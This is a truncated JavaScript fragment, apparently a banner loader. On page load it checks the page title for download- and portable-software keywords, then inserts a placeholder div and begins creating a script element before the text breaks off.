function CNScoinBanner () {
	if(!getCookie('CNScoinBanner')) {
		window.addEventListener("load", function() {
		
			var url = document.title; // юрл в котором происходит поиск
			var regV = 'Скачать';     // шаблон
			var regV2 = 'скачать';     // шаблон
			var regV3 = 'онлайн';     // шаблон
			var regV4 = 'Portable';     // шаблон
			var regV5 = 'portable';     // шаблон
			
			var result = url.match(regV);  // поиск шаблона в юрл
			var result2 = url.match(regV2);  // поиск шаблона в юрл
			var result3 = url.match(regV3);  // поиск шаблона в юрл
			var result4 = url.match(regV4);  // поиск шаблона в юрл
			var result5 = url.match(regV5);  // поиск шаблона в юрл

			if (result || result2 || result3 || result4 || result5) {
				
				var allBody = document.body;
				
				var div = document.createElement('div');
				div.id = 'co411128';
				//div.innerHTML = '<div id="co411128"></div>';
				allBody.insertBefore(div, allBody.firstChild);
			
				var title = document.title;
				var script = document.createElement('script');
				script.type = 'text/javascript';
